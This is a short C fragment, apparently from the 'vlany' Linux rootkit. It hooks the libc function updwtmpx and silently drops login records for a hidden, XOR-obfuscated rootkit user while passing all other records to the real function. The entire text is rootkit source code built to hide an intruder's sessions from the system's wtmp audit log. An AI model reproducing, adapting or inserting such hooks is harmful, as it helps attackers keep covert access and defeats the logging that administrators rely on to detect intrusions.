void updwtmpx(const char *wfilex, const struct utmpx *utx)
{
    #ifdef DEBUG
        printf("[vlany] updwtmpx() called\n");
    #endif

    if(utx && utx->ut_user != NULL)
    {
        char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
        if(!strcmp(utx->ut_user, vlany_user)) { CLEAN(vlany_user); return; }
        CLEAN(vlany_user);
    }

    HOOK(old_updwtmpx, CUPDWTMPX);
    old_updwtmpx(wfilex, utx);
}
